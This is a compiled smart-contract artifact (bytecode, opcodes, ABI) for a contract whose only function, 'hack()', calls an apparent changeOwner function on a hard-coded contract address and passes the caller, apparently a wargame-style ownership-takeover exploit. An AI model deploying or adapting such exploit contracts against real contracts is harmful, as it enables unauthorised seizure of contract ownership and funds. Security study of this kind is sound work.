{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561001057600080fd5b5061014d806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c80634de260a214610030575b600080fd5b61003861003a565b005b73a131ad247055fd2e2aa8b156a11bdec81b9ead9573ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1336040518263ffffffff1660e01b815260040161008791906100ca565b600060405180830381600087803b1580156100a157600080fd5b505af11580156100b5573d6000803e3d6000fd5b50505050565b6100c4816100e5565b82525050565b60006020820190506100df60008301846100bb565b92915050565b60006100f0826100f7565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff8216905091905056fea26469706673582212206f5e473d5db44c6782dd02a8235c9c7814a81fddef028988cd5c0c64b8e58d2364736f6c63430008060033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x14D DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4DE260A2 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x3A JUMP JUMPDEST STOP JUMPDEST PUSH20 0xA131AD247055FD2E2AA8B156A11BDEC81B9EAD95 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA6F9DAE1 CALLER PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x87 SWAP2 SWAP1 PUSH2 0xCA JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xA1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xB5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 0xC4 DUP2 PUSH2 0xE5 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xDF PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xBB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xF0 DUP3 PUSH2 0xF7 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH16 0x5E473D5DB44C6782DD02A8235C9C7814 0xA8 0x1F 0xDD 0xEF MUL DUP10 DUP9 0xCD 0x5C 0xC PUSH5 0xB8E58D2364 PUSH20 0x6F6C634300080600330000000000000000000000 "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "66600",
				"executionCost": "117",
				"totalCost": "66717"
			},
			"external": {
				"hack()": "infinite"
			}
		},
		"methodIdentifiers": {
			"hack()": "4de260a2"
		}
	},
	"abi": [
		{
			"inputs": [],
			"name": "hack",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		}
	]
}